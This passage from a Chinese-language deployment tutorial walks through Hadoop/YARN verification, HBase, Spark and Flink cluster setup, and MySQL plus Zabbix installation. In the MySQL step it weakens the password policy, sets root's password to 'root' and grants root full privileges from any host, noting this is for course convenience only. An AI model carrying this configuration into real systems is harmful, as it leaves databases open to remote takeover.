<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-yarn.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如需停止可以执行</span></span><br><span class="line">stop-yarn.sh</span><br></pre></td></tr></table></figure>

<ul>
<li>启动历史服务器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mapred --daemon start historyserver</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如需停止将start更换为stop</span></span><br></pre></td></tr></table></figure>

<ul>
<li>启动web代理服务器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn-daemon.sh start proxyserver</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如需停止将start更换为stop</span></span><br></pre></td></tr></table></figure>

<h4 id="验证Hadoop集群运行情况"><a href="#验证Hadoop集群运行情况" class="headerlink" title="验证Hadoop集群运行情况"></a>验证Hadoop集群运行情况</h4><ul>
<li><p>在node1、node2、node3上通过jps验证进程是否都启动成功</p>
</li>
<li><p>验证HDFS，浏览器打开：<a href="http://node1:9870/">http://node1:9870</a></p>
</li>
</ul>
<p>创建文件test.txt，随意填入内容，并执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hadoop fs -put test.txt /test.txt</span><br><span class="line"></span><br><span class="line">hadoop fs -cat /test.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>验证YARN，浏览器打开：<a href="http://node1:8088/">http://node1:8088</a></li>
</ul>
<p>执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建文件words.txt，填入如下内容</span></span><br><span class="line">itheima itcast hadoop</span><br><span class="line">itheima hadoop hadoop</span><br><span class="line">itheima itcast</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将文件上传到HDFS中</span></span><br><span class="line">hadoop fs -put words.txt /words.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行如下命令验证YARN是否正常</span></span><br><span class="line">hadoop jar /export/server/hadoop/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.3.0.jar wordcount -Dmapred.job.queue.name=root.root /words.txt /output</span><br></pre></td></tr></table></figure>

<h2 id="大数据NoSQL数据库HBase集群部署"><a href="#大数据NoSQL数据库HBase集群部署" class="headerlink" title="大数据NoSQL数据库HBase集群部署"></a>大数据NoSQL数据库HBase集群部署</h2><h3 id="简介-9"><a href="#简介-9" class="headerlink" title="简介"></a>简介</h3><p>HBase 是一种分布式、可扩展、支持海量数据存储的 NoSQL 数据库。</p>
<p>和Redis一样，HBase是一款KeyValue型存储的数据库。</p>
<p>不过和Redis设计方向不同</p>
<ul>
<li>Redis设计为少量数据，超快检索</li>
<li>HBase设计为海量数据，快速检索<br>HBase在大数据领域应用十分广泛，现在我们来在node1、node2、node3上部署HBase集群。</li>
</ul>
<h3 id="安装-11"><a href="#安装-11" class="headerlink" title="安装"></a>安装</h3><ul>
<li>HBase依赖Zookeeper、JDK、Hadoop（HDFS），请确保已经完成前面</li>
</ul>
<p>集群化软件前置准备（JDK）<br>Zookeeper<br>Hadoop<br>这些环节的软件安装</p>
<ul>
<li>【node1执行】下载HBase安装包</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载</span></span><br><span class="line">wget http://archive.apache.org/dist/hbase/2.1.0/hbase-2.1.0-bin.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf hbase-2.1.0-bin.tar.gz -C /export/server</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置软链接</span></span><br><span class="line">ln -s /export/server/hbase-2.1.0 /export/server/hbase</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1执行】，修改配置文件，修改conf&#x2F;hbase-env.sh文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在28行配置JAVA_HOME</span></span><br><span class="line">export JAVA_HOME=/export/server/jdk</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在126行配置：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">意思表示，不使用HBase自带的Zookeeper，而是用独立Zookeeper</span></span><br><span class="line">export HBASE_MANAGES_ZK=false</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在任意行，比如26行，添加如下内容：</span></span><br><span class="line">export HBASE_DISABLE_HADOOP_CLASSPATH_LOOKUP=&quot;true&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1执行】，修改配置文件，修改conf&#x2F;hbase-site.xml文件</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># 将文件的全部内容替换成如下内容：</span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- HBase数据在HDFS中的存放的路径 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.rootdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://node1:8020/hbase<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Hbase的运行模式。false是单机模式，true是分布式模式。若为false,Hbase和Zookeeper会运行在同一个JVM里面 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.cluster.distributed<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ZooKeeper的地址 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>node1,node2,node3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ZooKeeper快照的存储位置 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.property.dataDir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/export/server/apache-zookeeper-3.6.0-bin/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  V2.1版本，在分布式情况下, 设置为false --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.unsafe.stream.capability.enforce<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>【node1执行】，修改配置文件，修改conf&#x2F;regionservers文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">填入如下内容</span></span><br><span class="line">node1</span><br><span class="line">node2</span><br><span class="line">node3</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1执行】，分发hbase到其它机器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -r /export/server/hbase-2.1.0 node2:/export/server/</span><br><span class="line">scp -r /export/server/hbase-2.1.0 node3:/export/server/</span><br></pre></td></tr></table></figure>

<ul>
<li>【node2、node3执行】，配置软链接</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /export/server/hbase-2.1.0 /export/server/hbase</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1、node2、node3执行】，配置环境变量</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置在/etc/profile内，追加如下两行</span></span><br><span class="line">export HBASE_HOME=/export/server/hbase</span><br><span class="line">export PATH=$HBASE_HOME/bin:$PATH</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1执行】启动HBase<blockquote>
<p>请确保：Hadoop HDFS、Zookeeper是已经启动了的</p>
</blockquote>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-hbase.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如需停止可使用</span></span><br><span class="line">stop-hbase.sh</span><br></pre></td></tr></table></figure>

<blockquote>
<p>由于我们配置了环境变量export PATH&#x3D;$PATH:$HBASE_HOME&#x2F;bin</p>
</blockquote>
<p>start-hbase.sh即在$HBASE_HOME&#x2F;bin内，所以可以无论当前目录在哪，均可直接执行</p>
<ul>
<li>验证HBase</li>
</ul>
<p>浏览器打开：<a href="http://node1:16010，即可看到HBase的WEB">http://node1:16010，即可看到HBase的WEB</a> UI页面</p>
<ul>
<li>简单测试使用HBase</li>
</ul>
<p>【node1执行】</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hbase shell</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建表</span></span><br><span class="line">create &#x27;test&#x27;, &#x27;cf&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">插入数据</span></span><br><span class="line">put &#x27;test&#x27;, &#x27;rk001&#x27;, &#x27;cf:info&#x27;, &#x27;itheima&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询数据</span></span><br><span class="line">get &#x27;test&#x27;, &#x27;rk001&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫描表数据</span></span><br><span class="line">scan &#x27;test&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="分布式内存计算Spark环境部署"><a href="#分布式内存计算Spark环境部署" class="headerlink" title="分布式内存计算Spark环境部署"></a>分布式内存计算Spark环境部署</h2><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><p>本小节的操作，基于：大数据集群（Hadoop生态）安装部署环节中所构建的Hadoop集群</p>
<p>如果没有Hadoop集群，请参阅前置内容，部署好环境。</p>
<h3 id="简介-10"><a href="#简介-10" class="headerlink" title="简介"></a>简介</h3><p>Spark是一款分布式内存计算引擎，可以支撑海量数据的分布式计算。</p>
<p>Spark在大数据体系是明星产品，作为最新一代的综合计算引擎，支持离线计算和实时计算。</p>
<p>在大数据领域广泛应用，是目前世界上使用最多的大数据分布式计算引擎。</p>
<p>我们将基于前面构建的Hadoop集群，部署Spark Standalone集群。</p>
<h3 id="安装-12"><a href="#安装-12" class="headerlink" title="安装"></a>安装</h3><ul>
<li>【node1执行】下载并解压</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://archive.apache.org/dist/spark/spark-2.4.5/spark-2.4.5-bin-hadoop2.7.tgz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf spark-2.4.5-bin-hadoop2.7.tgz -C /export/server/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">软链接</span></span><br><span class="line">ln -s /export/server/spark-2.4.5-bin-hadoop2.7 /export/server/spark</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1执行】修改配置文件名称</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">改名</span></span><br><span class="line">cd /export/server/spark/conf</span><br><span class="line">mv spark-env.sh.template spark-env.sh</span><br><span class="line">mv slaves.template slaves</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1执行】修改配置文件，spark-env.sh</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 设置JAVA安装目录</span></span></span><br><span class="line">JAVA_HOME=/export/server/jdk</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># HADOOP软件配置文件目录，读取HDFS上文件和运行YARN集群</span></span></span><br><span class="line">HADOOP_CONF_DIR=/export/server/hadoop/etc/hadoop</span><br><span class="line">YARN_CONF_DIR=/export/server/hadoop/etc/hadoop</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 指定spark老大Master的IP和提交任务的通信端口</span></span></span><br><span class="line">export SPARK_MASTER_HOST=node1</span><br><span class="line">export SPARK_MASTER_PORT=7077</span><br><span class="line"></span><br><span class="line">SPARK_MASTER_WEBUI_PORT=8080</span><br><span class="line">SPARK_WORKER_CORES=1</span><br><span class="line">SPARK_WORKER_MEMORY=1g</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1执行】修改配置文件，slaves</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node1</span><br><span class="line">node2</span><br><span class="line">node3</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1执行】分发</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp -r spark-2.4.5-bin-hadoop2.7 node2:$PWD</span><br><span class="line">scp -r spark-2.4.5-bin-hadoop2.7 node3:$PWD</span><br></pre></td></tr></table></figure>

<ul>
<li>【node2、node3执行】设置软链接</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -s /export/server/spark-2.4.5-bin-hadoop2.7 /export/server/spark</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1执行】启动Spark集群</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/export/server/spark/sbin/start-all.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如需停止，可以</span></span><br><span class="line">/export/server/spark/sbin/stop-all.sh</span><br></pre></td></tr></table></figure>

<ul>
<li>打开Spark监控页面，浏览器打开：<a href="http://node1:8081/">http://node1:8081</a></li>
<li>【node1执行】提交测试任务</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/export/server/spark/bin/spark-submit --master spark://node1:7077 --class org.apache.spark.examples.SparkPi /export/server/spark/examples/jars/spark-examples_2.11-2.4.5.jar</span><br></pre></td></tr></table></figure>

<h2 id="分布式内存计算Flink环境部署"><a href="#分布式内存计算Flink环境部署" class="headerlink" title="分布式内存计算Flink环境部署"></a>分布式内存计算Flink环境部署</h2><h3 id="注意-2"><a href="#注意-2" class="headerlink" title="注意"></a>注意</h3><p>本小节的操作，基于：大数据集群（Hadoop生态）安装部署环节中所构建的Hadoop集群</p>
<p>如果没有Hadoop集群，请参阅前置内容，部署好环境。</p>
<h3 id="简介-11"><a href="#简介-11" class="headerlink" title="简介"></a>简介</h3><p>Flink同Spark一样，是一款分布式内存计算引擎，可以支撑海量数据的分布式计算。</p>
<p>Flink在大数据体系同样是明星产品，作为最新一代的综合计算引擎，支持离线计算和实时计算。</p>
<p>在大数据领域广泛应用，是目前世界上除去Spark以外，应用最为广泛的分布式计算引擎。</p>
<p>我们将基于前面构建的Hadoop集群，部署Flink Standalone集群</p>
<p>Spark更加偏向于离线计算而Flink更加偏向于实时计算。</p>
<h3 id="安装-13"><a href="#安装-13" class="headerlink" title="安装"></a>安装</h3><ul>
<li>【node1操作】下载安装包</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://archive.apache.org/dist/flink/flink-1.10.0/flink-1.10.0-bin-scala_2.11.tgz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压</span></span><br><span class="line">tar -zxvf flink-1.10.0-bin-scala_2.11.tgz -C /export/server/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">软链接</span></span><br><span class="line">ln -s /export/server/flink-1.10.0 /export/server/flink</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1操作】修改配置文件，conf&#x2F;flink-conf.yaml</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">jobManager 的IP地址</span></span><br><span class="line">jobmanager.rpc.address: node1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">JobManager 的端口号</span></span><br><span class="line">jobmanager.rpc.port: 6123</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">JobManager JVM heap 内存大小</span></span><br><span class="line">jobmanager.heap.size: 1024m</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">TaskManager JVM heap 内存大小</span></span><br><span class="line">taskmanager.heap.size: 1024m</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">每个 TaskManager 提供的任务 slots 数量大小</span></span><br><span class="line">taskmanager.numberOfTaskSlots: 2</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">是否进行预分配内存，默认不进行预分配，这样在我们不使用flink集群时候不会占用集群资源</span></span><br><span class="line">taskmanager.memory.preallocate: false</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">程序默认并行计算的个数</span></span><br><span class="line">parallelism.default: 1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">JobManager的Web界面的端口（默认：8081）</span></span><br><span class="line">jobmanager.web.port: 8081</span><br></pre></td></tr></table></figure>
<ul>
<li>【node1操作】，修改配置文件，conf&#x2F;slaves</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node1</span><br><span class="line">node2</span><br><span class="line">node3</span><br></pre></td></tr></table></figure>
<ul>
<li>【node1操作】分发Flink安装包到其它机器</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /export/server</span><br><span class="line">scp -r flink-1.10.0 node2:`pwd`/</span><br><span class="line">scp -r flink-1.10.0 node3:`pwd`/</span><br></pre></td></tr></table></figure>

<ul>
<li>【node2、node3操作】</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置软链接</span></span><br><span class="line">ln -s /export/server/flink-1.10.0 /export/server/flink</span><br></pre></td></tr></table></figure>

<ul>
<li>【node1操作】，启动Flink</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/export/server/flink/bin/start-cluster.sh</span><br></pre></td></tr></table></figure>

<ul>
<li>验证Flink启动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">浏览器打开</span></span><br><span class="line">http://node1:8081</span><br></pre></td></tr></table></figure>

<ul>
<li>提交测试任务</li>
</ul>
<p>【node1执行】</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/export/server/flink/bin/flink run /export/server/flink-1.10.0/examples/batch/WordCount.jar</span><br></pre></td></tr></table></figure>

<h2 id="运维监控Zabbix部署"><a href="#运维监控Zabbix部署" class="headerlink" title="运维监控Zabbix部署"></a>运维监控Zabbix部署</h2><h3 id="简介-12"><a href="#简介-12" class="headerlink" title="简介"></a>简介</h3><p>Zabbix 由 Alexei Vladishev 创建，目前由其成立的公司—— Zabbix SIA 积极的持续开发更新维护， 并为用户提供技术支持服务。</p>
<p>Zabbix 是一个&#x3D;&#x3D;企业级分布式开源监控解决方案&#x3D;&#x3D;。</p>
<p>Zabbix 软件能够&#x3D;&#x3D;监控&#x3D;&#x3D;众多网络参数和服务器的&#x3D;&#x3D;健康度、完整性&#x3D;&#x3D;。Zabbix 使用灵活的告警机制，允许用户为几乎任何事件配置基于邮件的告警。这样用户可以快速响应服务器问题。Zabbix 基于存储的数据提供出色的报表和数据可视化功能。这些功能使得 Zabbix 成为容量规划的理想选择。</p>
<h3 id="安装-14"><a href="#安装-14" class="headerlink" title="安装"></a>安装</h3><ul>
<li>准备Linux 服务器(虚拟机)</li>
<li>安装Mysql</li>
<li>安装zabbix( 包含 server agent web)</li>
<li>配置 mysql, 为zabbix创建表结构</li>
<li>配置zabbix server</li>
<li>启动并开启开机自启动<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/zabbixOne.png"></li>
</ul>
<h4 id="安装前准备-Mysql"><a href="#安装前准备-Mysql" class="headerlink" title="安装前准备 - Mysql"></a>安装前准备 - Mysql</h4><p>安装ZabbixServer需要先安装好Mysql数据库</p>
<p>课程使用Mysql 5.7</p>
<p>安装步骤：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装Mysql yum库</span></span><br><span class="line">rpm -Uvh http://repo.mysql.com//mysql57-community-release-el7-7.noarch.rpm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum安装Mysql</span></span><br><span class="line">yum -y install mysql-community-server</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动Mysql设置开机启动</span></span><br><span class="line">systemctl start mysqld</span><br><span class="line">systemctl enable mysqld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">检查Mysql服务状态</span></span><br><span class="line">systemctl status mysqld</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一次启动mysql，会在日志文件中生成root用户的一个随机密码，使用下面命令查看该密码</span></span><br><span class="line">grep &#x27;temporary password&#x27; /var/log/mysqld.log</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改root用户密码</span></span><br><span class="line">mysql -u root -p -h localhost</span><br><span class="line">Enter password:</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;Root!@#$&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果你想设置简单密码，需要降低Mysql的密码安全级别</span></span><br><span class="line">set global validate_password_policy=LOW; # 密码安全级别低</span><br><span class="line">set global validate_password_length=4;	 # 密码长度最低4位即可</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">然后就可以用简单密码了（课程中使用简单密码，为了方便，生产中不要这样）</span></span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;root&#x27;;</span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">grant all privileges on *.* to root@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&#x27;root&#x27;</span>;</span></span><br></pre></td></tr></table></figure>

<h4 id="安装Zabbix-Server-和-Zabbix-Agent"><a href="#安装Zabbix-Server-和-Zabbix-Agent" class="headerlink" title="安装Zabbix Server 和 Zabbix Agent"></a>安装Zabbix Server 和 Zabbix Agent</h4><blockquote>
<p>初始安装，我们先安装ZabbixServer以及在Server本机安装Agent。<br>打开官网下载页面：<a href="https://www.zabbix.com/download?zabbix=4.0&os_distribution=centos&os_version=7&db=mysql"></a><br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/zabbixTwo.png"><br>选择对应的版本，然后再下面官网给出了具体的安装命令，使用rpm和yum来进行安装。</p>
</blockquote>
<p>需要有网络。</p>
<h5 id="a-安装Zabbix-yum库"><a href="#a-安装Zabbix-yum库" class="headerlink" title="a. 安装Zabbix yum库"></a>a. 安装Zabbix yum库</h5><p><a href="https://www.zabbix.com/documentation/4.0/en/manual/installation/install_from_packages"></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -Uvh https://repo.zabbix.com/zabbix/4.0/rhel/7/x86_64/zabbix-release-4.0-2.el7.noarch.rpm</span><br><span class="line">yum clean all</span><br></pre></td></tr></table></figure>

<h5 id="b-安装Zabbix-Server、前端、Agent"><a href="#b-安装Zabbix-Server、前端、Agent" class="headerlink" title="b. 安装Zabbix Server、前端、Agent"></a>b. 安装Zabbix Server、前端、Agent</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install zabbix-server-mysql zabbix-web-mysql zabbix-agent</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果只需要安装Agent的话</span></span><br><span class="line">yum -y install zabbix-agent</span><br></pre></td></tr></table></figure>
<h5 id="c-初始化Mysql数据库"><a href="#c-初始化Mysql数据库" class="headerlink" title="c. 初始化Mysql数据库"></a>c. 初始化Mysql数据库</h5><p><a href="https://www.zabbix.com/documentation/4.0/en/manual/appendix/install/db_scripts"></a></p>
<blockquote>
<p>在Mysql中操作</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">登录Mysql 数据库</span></span><br><span class="line">mysql -uroot -pYourPassword</span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">create database zabbix character <span class="built_in">set</span> utf8 collate utf8_bin;</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">grant all privileges on zabbix.* to zabbix@localhost identified by <span class="string">&#x27;zabbix&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者: grant all privileges on zabbix.* to zabbix@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&#x27;zabbix&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">quit;</span></span><br></pre></td></tr></table></figure>
<p>测试在Zabbix Server服务器上能否远程登录Mysql，如果可以登录继续向下走。</p>
<p>Import initial schema and data. You will be prompted to enter your newly created password.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -p zabbix</span></span><br></pre></td></tr></table></figure>
<h5 id="d-为Zabbix-Server配置数据库"><a href="#d-为Zabbix-Server配置数据库" class="headerlink" title="d. 为Zabbix Server配置数据库"></a>d. 为Zabbix Server配置数据库</h5><p>Edit file &#x2F;etc&#x2F;zabbix&#x2F;zabbix_server.conf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DBPassword=password</span><br><span class="line">DBHost=mysql-host-ip-or-hostname</span><br></pre></td></tr></table></figure>

<h5 id="e-配置Zabbix的PHP前端"><a href="#e-配置Zabbix的PHP前端" class="headerlink" title="e. 配置Zabbix的PHP前端"></a>e. 配置Zabbix的PHP前端</h5><p>Edit file &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;zabbix.conf, uncomment and set the right timezone for you.# php_value date.timezone Asia&#x2F;Shanghai</p>
<p>Start Zabbix server and agent processes and make it start at system boot:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl restart zabbix-server zabbix-agent httpd # 启动、重启</span><br><span class="line">systemctl enable zabbix-server zabbix-agent httpd  # 开机自启</span><br></pre></td></tr></table></figure>
<p>Now your Zabbix server is up and running!\</p>
<h4 id="配置zabbix-前端（WEB-UI）"><a href="#配置zabbix-前端（WEB-UI）" class="headerlink" title="配置zabbix 前端（WEB UI）"></a>配置zabbix 前端（WEB UI）</h4><p>打开:<a href="http://192.168.88.131/zabbix">http://192.168.88.131/zabbix</a></p>
<p>即可进入Zabbix页面，在首次打开的时候，会进入设置页面，如图：<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/zabbixThree.png"></p>
<p>点击下一步，会检查相应的设置是否都正常<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/zabbixFour.png"></p>
<p>如果一切正常，点击下一步。</p>
<p>配置DB连接<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/zabbixFive.png"><br>按具体情况填写即可</p>
